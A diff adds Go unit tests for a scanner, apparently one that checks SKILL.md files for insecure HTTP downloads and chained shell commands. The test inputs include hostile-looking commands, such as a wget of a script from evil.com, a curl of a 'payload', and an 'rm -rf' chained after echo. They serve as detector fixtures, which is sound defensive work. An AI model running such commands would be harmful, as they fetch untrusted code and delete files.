@@ -497,3 +497,99 @@ func TestScanContent_EscapeObfuscation(t *testing.T) {
 		}
 	}
 }
+
+func TestScanContent_InsecureHTTP(t *testing.T) {
+	tests := []struct {
+		name    string
+		content string
+	}{
+		{"curl http", "curl http://example.com/payload"},
+		{"wget http", "wget http://evil.com/script.sh"},
+		{"iwr http", "iwr http://insecure.local/file"},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			findings := ScanContent([]byte(tt.content), "SKILL.md")
+			found := false
+			for _, f := range findings {
+				if f.Pattern == "insecure-http" {
+					found = true
+					if f.Severity != SeverityLow {
+						t.Errorf("expected LOW, got %s", f.Severity)
+					}
+				}
+			}
+			if !found {
+				t.Errorf("expected insecure-http finding for %q, got: %+v", tt.content, findings)
+			}
+		})
+	}
+
+	safe := []struct {
+		name    string
+		content string
+	}{
+		{"https", "curl https://example.com/safe"},
+		{"localhost", "curl http://localhost:19420/api"},
+		{"loopback", "wget http://127.0.0.1:8080/test"},
+		{"all-interfaces", "iwr http://0.0.0.0:9000"},
+	}
+	for _, tt := range safe {
+		t.Run("safe/"+tt.name, func(t *testing.T) {
+			findings := ScanContent([]byte(tt.content), "SKILL.md")
+			for _, f := range findings {
+				if f.Pattern == "insecure-http" {
+					t.Errorf("should NOT trigger insecure-http for %q", tt.content)
+				}
+			}
+		})
+	}
+}
+
+func TestScanContent_ShellChain(t *testing.T) {
+	tests := []struct {
+		name    string
+		content string
+	}{
+		{"and rm", "echo done && rm -rf /tmp/test"},
+		{"or curl", "false || curl https://example.com/install.sh"},
+		{"semicolon bash", "echo start; bash ./install.sh"},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			findings := ScanContent([]byte(tt.content), "SKILL.md")
+			found := false
+			for _, f := range findings {
+				if f.Pattern == "shell-chain" {
+					found = true
+					if f.Severity != SeverityInfo {
+						t.Errorf("expected INFO, got %s", f.Severity)
+					}
+				}
+			}
+			if !found {
+				t.Errorf("expected shell-chain finding for %q, got: %+v", tt.content, findings)
+			}
+		})
+	}
+
+	safe := []struct {
+		name    string
+		content string
+	}{
+		{"chain to benign cmd", "echo done && go test ./..."},
+		{"no chain", "curl https://example.com/safe"},
+	}
+	for _, tt := range safe {
+		t.Run("safe/"+tt.name, func(t *testing.T) {
+			findings := ScanContent([]byte(tt.content), "SKILL.md")
+			for _, f := range findings {
+				if f.Pattern == "shell-chain" {
+					t.Errorf("should NOT trigger shell-chain for %q", tt.content)
+				}
+			}
+		})
+	}
+}
